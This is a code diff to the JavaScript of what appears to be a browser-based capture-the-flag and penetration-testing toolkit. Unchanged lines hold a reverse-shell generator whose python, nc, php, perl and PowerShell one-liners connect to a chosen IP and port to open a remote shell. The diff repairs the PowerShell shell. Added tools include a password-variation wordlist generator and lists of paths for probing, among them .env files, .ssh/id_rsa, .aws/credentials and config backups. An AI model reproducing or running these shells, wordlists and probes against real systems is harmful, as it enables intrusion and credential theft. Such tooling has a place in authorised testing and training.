@@ -262,7 +262,7 @@ function genShell(type) {
         python: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
         nc: `nc -e /bin/sh ${ip} ${port}`,
         php: `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
-        powershell: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
+        powershell: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
         perl: `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
     };
     
@@ -330,5 +330,228 @@ function genSQLi() {
     
     result.innerHTML = (payloads[type] || []).map(p => 
         `<div class="result-item" onclick="copyText(\`${p.replace(/`/g, '\\`')}\`)">${p}</div>`
+    ).join('');
+}
+
+// ========== STRING ANALYZER ==========
+
+function analyzeString() {
+    const input = document.getElementById('analyzeInput').value;
+    const result = document.getElementById('analyzeResult');
+    
+    if (!input) {
+        result.innerHTML = '<span style="color:var(--text-muted)">Enter text to analyze</span>';
+        return;
+    }
+    
+    const len = input.length;
+    const bytes = new TextEncoder().encode(input).length;
+    const hasUpper = /[A-Z]/.test(input);
+    const hasLower = /[a-z]/.test(input);
+    const hasDigit = /[0-9]/.test(input);
+    const hasSpecial = /[^A-Za-z0-9]/.test(input);
+    const isBase64 = /^[A-Za-z0-9+/]+=*$/.test(input) && len % 4 === 0;
+    const isHex = /^[0-9a-fA-F\s]+$/.test(input);
+    const isPrintable = /^[\x20-\x7E\s]+$/.test(input);
+    
+    // Calculate entropy
+    const freq = {};
+    for (const c of input) freq[c] = (freq[c] || 0) + 1;
+    let entropy = 0;
+    for (const c in freq) {
+        const p = freq[c] / len;
+        entropy -= p * Math.log2(p);
+    }
+    
+    result.innerHTML = `
+        <div class="result-item"><span class="label">Length:</span>${len} chars, ${bytes} bytes</div>
+        <div class="result-item"><span class="label">Entropy:</span>${entropy.toFixed(2)} bits/char</div>
+        <div class="result-item"><span class="label">Charset:</span>${hasUpper?'A-Z ':''}${hasLower?'a-z ':''}${hasDigit?'0-9 ':''}${hasSpecial?'Special':''}</div>
+        <div class="result-item"><span class="label">Patterns:</span>${isBase64?'Likely Base64 ':''}${isHex?'Hex ':''}${isPrintable?'Printable':'Non-printable'}</div>
+    `;
+}
+
+// ========== FLAG DECODER ==========
+
+function decodeFlag() {
+    const input = document.getElementById('flagInput').value.trim();
+    const result = document.getElementById('flagResult');
+    
+    if (!input) {
+        result.innerHTML = '<span style="color:var(--text-muted)">Enter flag or encoded text</span>';
+        return;
+    }
+    
+    let html = '<div class="result-item"><span class="label">Original:</span>' + input + '</div>';
+    
+    // Try Base64
+    try {
+        const b64 = atob(input.replace(/[^A-Za-z0-9+/=]/g, ''));
+        if (b64 && /[\x20-\x7E]/.test(b64)) {
+            html += `<div class="result-item" onclick="copyText('${b64}')"><span class="label">Base64:</span>${b64}</div>`;
+        }
+    } catch(e) {}
+    
+    // Try Hex
+    const cleanHex = input.replace(/[^0-9a-fA-F]/g, '');
+    if (cleanHex.length >= 2 && cleanHex.length % 2 === 0) {
+        try {
+            const fromHex = cleanHex.match(/.{2}/g).map(b => String.fromCharCode(parseInt(b, 16))).join('');
+            if (/[\x20-\x7E]/.test(fromHex)) {
+                html += `<div class="result-item" onclick="copyText('${fromHex}')"><span class="label">Hex:</span>${fromHex}</div>`;
+            }
+        } catch(e) {}
+    }
+    
+    // Try ROT13
+    const rot13 = input.replace(/[a-zA-Z]/g, c => {
+        const base = c <= 'Z' ? 65 : 97;
+        return String.fromCharCode((c.charCodeAt(0) - base + 13) % 26 + base);
+    });
+    html += `<div class="result-item" onclick="copyText('${rot13}')"><span class="label">ROT13:</span>${rot13}</div>`;
+    
+    // Try URL decode
+    try {
+        const urlDec = decodeURIComponent(input);
+        if (urlDec !== input) {
+            html += `<div class="result-item" onclick="copyText('${urlDec}')"><span class="label">URL:</span>${urlDec}</div>`;
+        }
+    } catch(e) {}
+    
+    // Reverse
+    const reversed = input.split('').reverse().join('');
+    html += `<div class="result-item" onclick="copyText('${reversed}')"><span class="label">Reversed:</span>${reversed}</div>`;
+    
+    result.innerHTML = html;
+}
+
+// ========== ASCII LOOKUP ==========
+
+function asciiLookup() {
+    const input = document.getElementById('asciiInput').value.trim();
+    const result = document.getElementById('asciiResult');
+    
+    if (!input) {
+        result.innerHTML = '<span style="color:var(--text-muted)">Enter character, decimal, or hex</span>';
+        return;
+    }
+    
+    let charCode;
+    
+    if (/^0x[0-9a-fA-F]+$/i.test(input)) {
+        charCode = parseInt(input, 16);
+    } else if (/^\d+$/.test(input)) {
+        charCode = parseInt(input, 10);
+    } else {
+        charCode = input.charCodeAt(0);
+    }
+    
+    if (charCode < 0 || charCode > 127) {
+        result.innerHTML = '<span style="color:var(--text-muted)">Value out of ASCII range (0-127)</span>';
+        return;
+    }
+    
+    const char = charCode >= 32 && charCode < 127 ? String.fromCharCode(charCode) : (charCode === 32 ? 'SPACE' : 'CTRL');
+    
+    result.innerHTML = `
+        <div class="result-item"><span class="label">Char:</span>${char}</div>
+        <div class="result-item"><span class="label">Dec:</span>${charCode}</div>
+        <div class="result-item"><span class="label">Hex:</span>0x${charCode.toString(16).toUpperCase().padStart(2, '0')}</div>
+        <div class="result-item"><span class="label">Bin:</span>${charCode.toString(2).padStart(8, '0')}</div>
+        <div class="result-item"><span class="label">Oct:</span>${charCode.toString(8)}</div>
+    `;
+}
+
+// ========== WORDLIST GENERATOR ==========
+
+function genWordlist() {
+    const base = document.getElementById('wordBase').value.trim();
+    const result = document.getElementById('wordlistResult');
+    
+    if (!base) {
+        result.innerHTML = '<span style="color:var(--text-muted)">Enter a base word</span>';
+        return;
+    }
+    
+    const variations = [
+        base,
+        base.toLowerCase(),
+        base.toUpperCase(),
+        base.charAt(0).toUpperCase() + base.slice(1).toLowerCase(),
+        base + '123',
+        base + '1234',
+        base + '12345',
+        base + '!',
+        base + '@',
+        base + '#',
+        base + '1',
+        base + '2',
+        base + '2024',
+        base + '2025',
+        base + '!@#',
+        '!' + base,
+        base + base,
+        base.split('').reverse().join(''),
+        base.replace(/a/gi, '@').replace(/e/gi, '3').replace(/i/gi, '1').replace(/o/gi, '0').replace(/s/gi, '$'),
+        base + '_',
+        '_' + base,
+        base + '.',
+        base + '?',
+        base + '01',
+        base + '99',
+        base + '007',
+    ];
+    
+    // Remove duplicates
+    const unique = [...new Set(variations)];
+    
+    result.innerHTML = unique.map(w => 
+        `<div class="result-item" onclick="copyText('${w}')">${w}</div>`
+    ).join('');
+}
+
+// ========== COMMON PATHS GENERATOR ==========
+
+function genPaths() {
+    const type = document.getElementById('pathType').value;
+    const result = document.getElementById('pathsResult');
+    
+    const paths = {
+        web: [
+            '/admin', '/login', '/dashboard', '/api', '/uploads',
+            '/backup', '/config', '/db', '/database', '/debug',
+            '/dev', '/test', '/staging', '/old', '/new',
+            '/wp-admin', '/wp-login.php', '/administrator',
+            '/.git', '/.env', '/.htaccess', '/robots.txt',
+            '/sitemap.xml', '/phpinfo.php', '/info.php',
+            '/server-status', '/server-info', '/console'
+        ],
+        api: [
+            '/api/v1', '/api/v2', '/api/users', '/api/admin',
+            '/api/login', '/api/auth', '/api/token', '/api/refresh',
+            '/graphql', '/api/graphql', '/api/swagger', '/swagger.json',
+            '/api-docs', '/api/docs', '/api/health', '/api/status',
+            '/api/config', '/api/debug', '/api/test', '/api/internal'
+        ],
+        backup: [
+            '/backup.zip', '/backup.tar.gz', '/backup.sql',
+            '/db.sql', '/database.sql', '/dump.sql',
+            '/site.zip', '/www.zip', '/html.zip',
+            '/.backup', '/old/', '/bak/', '/backup/',
+            '/index.php.bak', '/config.php.bak', '/wp-config.php.bak',
+            '/.git/config', '/.svn/entries', '/CVS/Root'
+        ],
+        config: [
+            '/.env', '/.env.local', '/.env.production', '/.env.backup',
+            '/config.php', '/configuration.php', '/settings.php',
+            '/wp-config.php', '/config.yml', '/config.json',
+            '/database.yml', '/secrets.yml', '/credentials.json',
+            '/.aws/credentials', '/.ssh/id_rsa', '/web.config',
+            '/appsettings.json', '/.docker/config.json'
+        ]
+    };
+    
+    result.innerHTML = (paths[type] || []).map(p => 
+        `<div class="result-item" onclick="copyText('${p}')">${p}</div>`
     ).join('');
 }
